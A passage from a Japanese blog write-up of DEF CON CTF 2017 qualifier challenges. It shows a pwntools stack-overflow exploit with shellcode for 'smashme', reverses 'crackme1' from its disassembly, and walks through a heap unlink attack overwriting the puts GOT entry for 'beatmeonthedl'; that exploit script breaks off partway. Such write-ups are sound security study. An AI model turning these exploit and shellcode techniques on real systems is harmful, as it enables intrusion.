<span id="cb4-8"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-8" aria-hidden="true" tabindex="-1"></a>addr_push_rsp_ret <span class="op">=</span> <span class="bn">0x0044611d</span> <span class="co"># 0x0044611d: push rsp ; ret  ;  (2 found)</span></span>
<span id="cb4-9"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-10"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-10" aria-hidden="true" tabindex="-1"></a>context(os<span class="op">=</span><span class="st">'linux'</span>, arch<span class="op">=</span><span class="st">'amd64'</span>)</span>
<span id="cb4-11"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-12"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="st">'remote'</span> <span class="kw">in</span> sys.argv:</span>
<span id="cb4-13"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-13" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> remote(<span class="st">'smashme_omgbabysfirst.quals.shallweplayaga.me'</span>, <span class="dv">57348</span>)</span>
<span id="cb4-14"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
<span id="cb4-15"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-15" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">'./smashme'</span>)</span>
<span id="cb4-16"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-17"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-17" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">'Welcome to the Dr. Phil Show. Wanna smash?</span><span class="ch">\n</span><span class="st">'</span>)</span>
<span id="cb4-18"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-18" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">''</span></span>
<span id="cb4-19"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-19" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'Smash me outside, how bout dAAAAAAAAAAA'</span></span>
<span id="cb4-20"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-20" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> <span class="dv">33</span></span>
<span id="cb4-21"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-21" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p64(addr_push_rsp_ret)</span>
<span id="cb4-22"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-22" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> asm(shellcraft.sh())</span>
<span id="cb4-23"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-23" aria-hidden="true" tabindex="-1"></a>r.sendline(buf)</span>
<span id="cb4-24"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-25"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb4-25" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
<pre><code>$ ./exploit.py remote
[+] Opening connection to smashme_omgbabysfirst.quals.shallweplayaga.me on port 57348: Done
[*] Switching to interactive mode
$ ls
flag
smashme
$ cat flag
The flag is: You must be at least this tall to play DEF CON CTF 5b43e02608d66dca6144aaec956ec68d
$ 
[*] Closed connection to smashme_omgbabysfirst.quals.shallweplayaga.me port 57348</code></pre>
<h2 id="crackme1">crackme1</h2>
<p>x86-64 の ELF.<br />
Alpine Linux で作られたようで, 実行には musl libc が必要.</p>
<pre><code>$ file 4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped, with debug_info

$ docker run -t -v &quot;$PWD&quot;:/work -w /work -i alpine /bin/sh        
/work # ./4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652 
enter code:
nyan
/work # </code></pre>
<p><code>"enter code:"</code>と表示した後に入力を受け付けているようだが, 適当に入力しただけでは <code>exit</code> されてしまう.<br />
それっぽい箇所をディスアセンブルするとこんな感じ. <code>"sum is %ld."</code> という表示がされていないことから <code>exit</code> を呼んでいるのは <code>fcn.00000c6c</code> の中だと推測できる.</p>
<pre><code>|           0x0000079b      488b15861820.  mov rdx, qword [obj.stdin]  ; [0x202028:8]=0x7368732e00003232 ; LEA obj.stdin ; &quot;22&quot; @ 0x202028
|           0x000007a2      be50000000     mov esi, 0x50               ; 'P'
|           0x000007a7      4889df         mov rdi, rbx
|           0x000007aa      e879ffffff     call sym.imp.fgets         ; char *fgets(char *s, int size, FILE *stream)
|           0x000007af      4889df         mov rdi, rbx
|           0x000007b2      e8b5040000     call fcn.00000c6c
|           0x000007b7      488d3d170700.  lea rdi, qword str.sum_is__ld_n ; 0xed5 ; str.sum_is__ld_n ; &quot;sum is %ld.&quot; @ 0xed5
|           0x000007be      4889c6         mov rsi, rax
|           0x000007c1      31c0           xor eax, eax
|           0x000007c3      e858ffffff     call sym.imp.printf </code></pre>
<p><code>fcn.00000c6c</code> を詳しく調べていく. この関数は第1引数 <code>rdi</code> に与えられた文字列を1文字ずつ別の関数に渡し, その返り値を <code>rbx</code> に足したりしているようだ.</p>
<pre><code>|           0x00000c6c      55             push rbp
|           0x00000c6d      53             push rbx
|           0x00000c6e      4889fd         mov rbp, rdi
|           0x00000c71      4883ec08       sub rsp, 8
|           0x00000c75      480fbe3f       movsx rdi, byte [rdi]
|           0x00000c79      e8bdfcffff     call fcn.0000093b
|           0x00000c7e      480fbe7d01     movsx rdi, byte [rbp + arg_1h] ; [0x1:1]=69
|           0x00000c83      48c1f803       sar rax, 3
|           0x00000c87      4889c3         mov rbx, rax
|           0x00000c8a      e8c6fcffff     call fcn.00000955
|           0x00000c8f      480fbe7d02     movsx rdi, byte [rbp + arg_2h] ; [0x2:1]=76
|           0x00000c94      4801c3         add rbx, rax                ; '#'
|           0x00000c97      48c1fb03       sar rbx, 3
|           0x00000c9b      e8d1fcffff     call fcn.00000971</code></pre>
<p>この別の関数というのはどれもこんな感じで, 引数が比較している値と違ったら <code>exit</code> を呼ぶというものであった. ということは, この比較している文字を見ていけば良さそう. (めんどくせえ…)</p>
<pre><code>|           0x0000093b      4883ff79       cmp rdi, 0x79               ; 'y' ; 'y'
|       ,=&lt; 0x0000093f      740e           je 0x94f
|       |   0x00000941      4883ec08       sub rsp, 8
|       |   0x00000945      bf01000000     mov edi, 1
|       |   0x0000094a      e809feffff     call sym.imp.exit          ; void exit(int status)
|       |      ; JMP XREF from 0x0000093f (fcn.0000093b)
|       `-&gt; 0x0000094f      b8a7000000     mov eax, 0xa7               ; section_end..shstrtab
\           0x00000954      c3             ret</code></pre>
<p>で, その結果 <code>"yes and his hands shook with ex"</code> という文字列が出てきた. でもこれは Flag ではないみたい.</p>
<p>問題文をよく見ると, 怪しい url が書かれていた. アクセスしてみると, 解答を base64 で送れと言われる. 実際にやってみると Flag が出てきた.</p>
<pre><code>$ echo yes and his hands shook with ex | base64
eWVzIGFuZCBoaXMgaGFuZHMgc2hvb2sgd2l0aCBleAo=

$ nc crackme1_f92e0ab22352440383d58be8f046bebe.quals.shallweplayaga.me 10001
send your solution as base64, followed by a newline
4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
eWVzIGFuZCBoaXMgaGFuZHMgc2hvb2sgd2l0aCBleAo=
The flag is: important videos best playlist Wigeekuk8
^C</code></pre>
<h2 id="beatmeonthedl">beatmeonthedl</h2>
<p>x86-64 の ELF.</p>
<pre><code>$ file beatmeonthedl
beatmeonthedl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, not stripped, with debug_info

$ checksec --file beatmeonthedl
[*] '/tmp/beatmeonthedl'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)</code></pre>
<p>実行してみると, まずユーザ名とパスワードを聞いてくる. これは gdb で適当な文字を入力したときの処理を追っていけば出てくる.</p>
<pre><code>$ ./beatmeonthedl
     __      __       .__                                  __           
    /  \    /  \ ____ |  |   ____  ____   _____   ____   _/  |_  ____   
    \   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \  \   __\/  _ \  
     \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |  | (  &lt;_&gt; ) 
      \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  |__|  \____/  
           \/       \/          \/            \/     \/                 
    __  .__             .__         .__                 _____    __  .__            
  _/  |_|  |__   ____   |  | _____  |__|______    _____/ ____\ _/  |_|  |__   ____  
  \   __\  |  \_/ __ \  |  | \__  \ |  \_  __ \  /  _ \   __\  \   __\  |  \_/ __ \ 
   |  | |   Y  \  ___/  |  |__/ __ \|  ||  | \/ (  &lt;_&gt; )  |     |  | |   Y  \  ___/ 
   |__| |___|  /\___  &gt; |____(____  /__||__|     \____/|__|     |__| |___|  /\___  &gt;
             \/     \/            \/                                      \/     \/ 
  _________.__                .___              __________                __
 /   _____/|  |__ _____     __| _/______  _  __ \______   \_______  ____ |  | __ ___________  ______
 \_____  \ |  |  \\__  \   / __ |/  _ \ \/ \/ /  |    |  _/\_  __ \/  _ \|  |/ \// __ \_  __ \/  ___/
 /        \|   Y  \/ __ \_/ /_/ (  &lt;_&gt; )     /   |    |   \ |  | \(  &lt;_&gt; )    &lt;\  ___/|  |  \/\___ \ 
/_______  /|___|  (____  /\____ |\____/ \/\_/    |______  / |__|   \____/|__|_ \\___  &gt;__|    /____ &gt;
        \/      \/     \/      \/                       \/                    \/    \/             \/ 
Enter username: mcfly
Enter Pass: awesnap
I) Request Exploit.
II) Print Requests.
III) Delete Request.
IV) Change Request.
V) Go Away.
| </code></pre>
<p>それ以降の処理を調べていく.</p>
<p>このプログラムは, <code>malloc(0x38)</code> した領域の確保/編集/開放, および確保した領域のリストアップができるというものだった. 気になる脆弱性は次の2つ.</p>
<ol type="1">
<li><code>malloc</code> は独自に組み込まれたもの (glibc じゃない) で, さらに確保した領域は実行可能になっている</li>
<li>“Request Exploit.” や “Change Request.” の確保した領域へ書き込む処理で0x80文字も読み込んでいて heap buffer overflow が起こせる</li>
</ol>
<p>何となく, この手の問題によくある unlink attack して GOT overwrite するやつかなーと推測できる.</p>
<pre><code>|      |`-&gt; 0x00401035      bf38000000     mov edi, 0x38               ; '8'
|      |    0x0040103a      e89d4a0000     call sym.malloc            ;  void *malloc(size_t size)
|      |    0x0040103f      4889c2         mov rdx, rax
|      |    0x00401042      8b45fc         mov eax, dword [rbp - local_4h]
|      |    0x00401045      4898           cdqe
|      |    0x00401047      488914c5809e.  mov qword [rax*8 + obj.reqlist], rdx ; [0x609e80:8]=0x4013b2 sym.init_mparams ; LEA obj.reqlist ; obj.reqlist

...

|      |    0x0040108e      488b04c5809e.  mov rax, qword [rax*8 + obj.reqlist] ; [0x609e80:8]=0x4013b2 sym.init_mparams ; LEA obj.reqlist ; obj.reqlist
|      |    0x00401096      ba80000000     mov edx, 0x80
|      |    0x0040109b      4889c6         mov rsi, rax
|      |    0x0040109e      bf00000000     mov edi, 0
|      |    0x004010a3      b800000000     mov eax, 0
|      |    0x004010a8      e873faffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)</code></pre>
<p>ということで, <code>malloc</code>, <code>free</code> の挙動を確認しながら次のような攻撃を行なった.</p>
<p>まず5つの領域 (buffer0 ~ buffer4 と呼ぶことにする) を確保し, buffer3, buffer1 の順で開放する. すると, heap は次のようになっていた. chunk の構造は glibc のものとだいたい同じで, <code>prev_size</code>, <code>size</code>, <code>fd</code>, <code>bk</code> に相当するメンバを持っていた. また, 開放した領域は 0x609b88 にある管理領域?が持つ chunk を先頭とする双方向循環リストになっていた.</p>
<p>ちなみに, chunk の番号と buffer の番号がずれているが, これは chunk0 が入力したパスワードを格納するために使われているためである.</p>
<pre><code>gdb-peda$ x/50gx 0x00db4000
0xdb4000:	0x0000000000000000	0x0000000000000023 &lt;- chunk0
0xdb4010:	0x0a70616e73657761	0x0000000000000000
0xdb4020:	0x0000000000000000	0x0000000000000043 &lt;- chunk1
0xdb4030:	0x0030726566667562	0x0000000000000000 &lt;- buffer0
0xdb4040:	0x0000000000000000	0x0000000000000000
0xdb4050:	0x0000000000000000	0x0000000000000000
0xdb4060:	0x0000000000000000	0x0000000000000041 &lt;- chunk2
0xdb4070:	0x0000000000db40e0	0x0000000000609b88
0xdb4080:	0x0000000000000000	0x0000000000000000
0xdb4090:	0x0000000000000000	0x0000000000000000
0xdb40a0:	0x0000000000000040	0x0000000000000042 &lt;- chunk3
0xdb40b0:	0x0032726566667562	0x0000000000000000 &lt;- buffer2
0xdb40c0:	0x0000000000000000	0x0000000000000000
0xdb40d0:	0x0000000000000000	0x0000000000000000
0xdb40e0:	0x0000000000000000	0x0000000000000041 &lt;- chunk4
0xdb40f0:	0x0000000000609b88	0x0000000000db4060
0xdb4100:	0x0000000000000000	0x0000000000000000
0xdb4110:	0x0000000000000000	0x0000000000000000
0xdb4120:	0x0000000000000040	0x0000000000000042 &lt;- chunk5
0xdb4130:	0x0034726566667562	0x0000000000000000 &lt;- buffer4
0xdb4140:	0x0000000000000000	0x0000000000000000
0xdb4150:	0x0000000000000000	0x0000000000000000
0xdb4160:	0x0000000000000000	0x0000000000000e51
0xdb4170:	0x0000000000000000	0x0000000000000000
0xdb4180:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/8gx 0x0000000000609b88
0x609b88 &lt;_gm_+200&gt;:	0x0000000000609b78	0x0000000000609b78 &lt;- top
0x609b98 &lt;_gm_+216&gt;:	0x0000000000db4060	0x0000000000db40e0
0x609ba8 &lt;_gm_+232&gt;:	0x0000000000609b98	0x0000000000609b98
0x609bb8 &lt;_gm_+248&gt;:	0x0000000000609ba8	0x0000000000609ba8</code></pre>
<p>次に buffer2 を通して chunk4 の <code>fd</code> を <code>puts</code> の GOT から 0x18 を引いた値に書き換えて,</p>
<pre><code>gdb-peda$ x/50gx 0x00db4000
0xdb4000:	0x0000000000000000	0x0000000000000023
0xdb4010:	0x0a70616e73657761	0x0000000000000000
0xdb4020:	0x0000000000000000	0x0000000000000043 &lt;- chunk1
0xdb4030:	0x0030726566667562	0x0000000000000000 &lt;- buffer0
0xdb4040:	0x0000000000000000	0x0000000000000000
0xdb4050:	0x0000000000000000	0x0000000000000000
0xdb4060:	0x0000000000000000	0x0000000000000041 &lt;- chunk2
0xdb4070:	0x0000000000db40e0	0x0000000000609b88
0xdb4080:	0x0000000000000000	0x0000000000000000
0xdb4090:	0x0000000000000000	0x0000000000000000
0xdb40a0:	0x0000000000000040	0x0000000000000042 &lt;- chunk3
0xdb40b0:	0x4141414141414141	0x4141414141414141 &lt;- buffer2
0xdb40c0:	0x4141414141414141	0x4141414141414141
0xdb40d0:	0x4141414141414141	0x4141414141414141
0xdb40e0:	0x4141414141414141	0x0000000000000041 &lt;- chunk4
0xdb40f0:	0x0000000000609940	0x0000000000db4060
0xdb4100:	0x0000000000000000	0x0000000000000000
0xdb4110:	0x0000000000000000	0x0000000000000000
0xdb4120:	0x0000000000000040	0x0000000000000042 &lt;- chunk5
0xdb4130:	0x0034726566667562	0x0000000000000000 &lt;- buffer4
0xdb4140:	0x0000000000000000	0x0000000000000000
0xdb4150:	0x0000000000000000	0x0000000000000000
0xdb4160:	0x0000000000000000	0x0000000000000e51
0xdb4170:	0x0000000000000000	0x0000000000000000
0xdb4180:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/8gx 0x0000000000609940
0x609940:	0x00007f6fb21795f0	0x0000000000400ab6
0x609950:	0x0000000000400ac6	0x00007f6fb1e2a110 &lt;- puts_got
0x609960:	0x00007f6fb1e41d10	0x0000000000400af6
0x609970:	0x00007f6fb1e10e00	0x00007f6fb1e459c0</code></pre>
<p>その後 buffer4 の開放を行ったところ, chunk4 と chunk5 の結合処理 (unlink) が走り, <code>puts</code> の GOT を chunk2 のアドレスに書き換えることができた.</p>
<pre><code>gdb-peda$ x/50gx 0x00db4000
0xdb4000:	0x0000000000000000	0x0000000000000023
0xdb4010:	0x0a70616e73657761	0x0000000000000000
0xdb4020:	0x0000000000000000	0x0000000000000043 &lt;- chunk1
0xdb4030:	0x0030726566667562	0x0000000000000000 &lt;- buffer0
0xdb4040:	0x0000000000000000	0x0000000000000000
0xdb4050:	0x0000000000000000	0x0000000000000000
0xdb4060:	0x0000000000000000	0x0000000000000041 &lt;- chunk2
0xdb4070:	0x0000000000609940	0x0000000000609b88
0xdb4080:	0x0000000000000000	0x0000000000000000
0xdb4090:	0x0000000000000000	0x0000000000000000
0xdb40a0:	0x0000000000000040	0x0000000000000042 &lt;- chunk3
0xdb40b0:	0x4141414141414141	0x4141414141414141 &lt;- buffer2
0xdb40c0:	0x4141414141414141	0x4141414141414141
0xdb40d0:	0x4141414141414141	0x4141414141414141
0xdb40e0:	0x4141414141414141	0x0000000000000ed1 &lt;- chunk4
0xdb40f0:	0x0000000000609940	0x0000000000db4060
0xdb4100:	0x0000000000000000	0x0000000000000000
0xdb4110:	0x0000000000000000	0x0000000000000000
0xdb4120:	0x0000000000000040	0x0000000000000042 &lt;- chunk5 (unlinked)
0xdb4130:	0x0034726566667562	0x0000000000000000
0xdb4140:	0x0000000000000000	0x0000000000000000
0xdb4150:	0x0000000000000000	0x0000000000000000
0xdb4160:	0x0000000000000000	0x0000000000000e51
0xdb4170:	0x0000000000000000	0x0000000000000000
0xdb4180:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/8gx 0x0000000000609940
0x609940:	0x00007f6fb21795f0	0x0000000000400ab6
0x609950:	0x0000000000400ac6	0x0000000000db4060 &lt;- puts_got
0x609960:	0x00007f6fb1e41d10	0x0000000000400af6
0x609970:	0x00007f6fb1e10e00	0x00007f6fb1e459c0</code></pre>
<p>このあとすぐにメニューを表示処理で <code>puts</code> が呼ばれるので, の開放を行う前に buffer0 を通して shellcode 書き込んでおけばよさそう. ただし, unlink attack 後は chunk2 の <code>fd</code> や <code>bk</code> が書き換わってしまうので, メインの shellcode は buffer0 に書き込み, chunk2 の先頭 (glibc malloc でいう <code>prev_size</code> に相当する部分) に <code>jmp -0x30</code> を置いて shellcode の先頭に飛ぶようにした.</p>
<p>実際に作成したスクリプトと実行結果は次の通り.<br />
攻撃では使わなかったが, 確保したバッファをリストアップする際に <code>printf</code> の <code>%s</code> を使っているのを利用して chunk4 の <code>bk</code> のリークなども行なっている.</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
<span id="cb17-2"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-3"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="co"># DEF CON 2017 Quals : beatmeonthedl</span></span>
<span id="cb17-4"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-5"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb17-6"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb17-7"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-8"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-8" aria-hidden="true" tabindex="-1"></a>username <span class="op">=</span> <span class="st">'mcfly'</span></span>
<span id="cb17-9"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-9" aria-hidden="true" tabindex="-1"></a>password <span class="op">=</span> <span class="st">'awesnap'</span></span>
<span id="cb17-10"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-11"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-11" aria-hidden="true" tabindex="-1"></a>buffer_size <span class="op">=</span> <span class="bn">0x38</span></span>
<span id="cb17-12"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-13"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-13" aria-hidden="true" tabindex="-1"></a><span class="co"># [0x0040123c]&gt; f~reloc.puts</span></span>
<span id="cb17-14"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x00609958 8 reloc.puts_88</span></span>
<span id="cb17-15"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-15" aria-hidden="true" tabindex="-1"></a>addr_puts_got <span class="op">=</span> <span class="bn">0x00609958</span></span>
<span id="cb17-16"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-17"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-17" aria-hidden="true" tabindex="-1"></a>context(os<span class="op">=</span><span class="st">'linux'</span>, arch<span class="op">=</span><span class="st">'amd64'</span>)</span>
<span id="cb17-18"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-19"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-19" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="st">'remote'</span> <span class="kw">in</span> sys.argv:</span>
<span id="cb17-20"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-20" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> remote(<span class="st">'beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me'</span>, <span class="dv">6969</span>)</span>
<span id="cb17-21"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-21" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
<span id="cb17-22"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-22" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">'./beatmeonthedl'</span>)</span>
<span id="cb17-23"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-24"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-24" aria-hidden="true" tabindex="-1"></a><span class="co"># login</span></span>
<span id="cb17-25"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-25" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">'Enter username: '</span>)</span>
<span id="cb17-26"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-26" aria-hidden="true" tabindex="-1"></a>r.sendline(username)</span>
<span id="cb17-27"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-27" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">'Enter Pass: '</span>)</span>
<span id="cb17-28"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-28" aria-hidden="true" tabindex="-1"></a>r.sendline(password)</span>
<span id="cb17-29"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-29" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">'I) Request Exploit.'</span>)</span>
<span id="cb17-30"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-30" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">'login successful!'</span>)</span>
<span id="cb17-31"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-32"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-32" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> choose_action(n):</span>
<span id="cb17-33"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-33" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">') Go Away.</span><span class="ch">\n</span><span class="st">| '</span>)</span>
<span id="cb17-34"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-34" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
<span id="cb17-35"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-36"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-36" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> add_request(text):</span>
<span id="cb17-37"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-37" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">1</span>)</span>
<span id="cb17-38"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-38" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'Request text &gt; '</span>)</span>
<span id="cb17-39"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-39" aria-hidden="true" tabindex="-1"></a>    r.send(text)</span>
<span id="cb17-40"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-41"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-41" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> delete_request(n):</span>
<span id="cb17-42"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-42" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">3</span>)</span>
<span id="cb17-43"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-43" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'choice: '</span>)</span>
<span id="cb17-44"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-44" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
<span id="cb17-45"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-46"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-46" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> update_request(n, text):</span>
<span id="cb17-47"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-47" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">4</span>)</span>
<span id="cb17-48"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-48" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'choice: '</span>)</span>
